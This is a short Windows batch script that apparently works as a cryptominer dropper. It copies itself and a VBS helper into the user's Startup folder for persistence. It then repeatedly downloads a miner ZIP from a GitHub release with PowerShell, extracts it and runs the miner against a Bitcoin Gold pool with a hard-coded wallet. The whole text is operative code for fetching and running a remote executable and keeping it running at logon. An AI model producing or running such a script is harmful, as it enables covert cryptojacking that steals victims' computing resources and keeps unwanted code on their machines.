copy cinit.vbs "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cinit.vbs"
copy cryptoMiner.bat "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cryptoMiner.bat"
:loop
cd %userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
powershell -command Invoke-WebRequest -Uri 'https://github.com/funakoshi2718/funakoshi-miner/releases/download/v5.2/funakoshiMiner.zip' -OutFile miner.zip
powershell Expand-Archive miner.zip -DestinationPath ./
funakoshiMiner.exe -l btg.suprnova.cc:8866 -u Gfymn9iwQ5AWLsbZDw8Bb6GFKE18CHCjAq
ping 127.0.0.1 -n 6 > nul
goto loop